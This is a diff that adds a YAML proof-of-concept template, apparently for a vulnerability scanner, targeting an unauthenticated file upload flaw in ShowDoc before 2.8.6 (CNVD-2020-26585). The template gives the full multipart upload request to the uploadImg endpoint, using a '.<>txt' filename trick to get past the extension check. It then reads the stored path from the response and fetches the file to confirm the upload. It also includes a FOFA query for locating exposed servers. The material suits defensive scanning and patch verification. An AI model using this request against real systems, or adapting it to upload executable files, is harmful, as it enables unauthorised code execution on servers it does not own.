@@ -1,0 +1,37 @@
+id: poc-yaml-showdoc-file-upload-cnvd-2020-26585
+info:
+  name: Showdoc <2.8.6 文件上传漏洞(CNVD-2020-26585)
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  - CNVD-2020-26585
+  finger: showdoc
+  fofa: app="ShowDoc"
+variables:
+  str1: random_str(8)
+requests:
+- method: POST
+  path: /index.php?s=/home/page/uploadImg
+  headers:
+    Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+  data: '----------------------------835846770881083140190633
+
+    Content-Disposition: form-data; name="editormd-image-file"; filename="{{.str1}}.<>txt"
+
+    Content-Type: text/plain
+
+
+    {{.str1}}
+
+    ----------------------------835846770881083140190633--
+
+    '
+  expression: status_code == 200
+  output:
+  - regex_match(body, `(?P<date>\d{4}-\d{2}-\d{2})\\/[a-f0-9]+\.txt`)
+  - regex_match(body, `\d{4}-\d{2}-\d{2}\\/(?P<file>[a-f0-9]+\.txt)`)
+- method: GET
+  path: /Public//Uploads//{{.date}}//{{.file}}
+  expression: status_code == 200 && body == str1
+transport: http
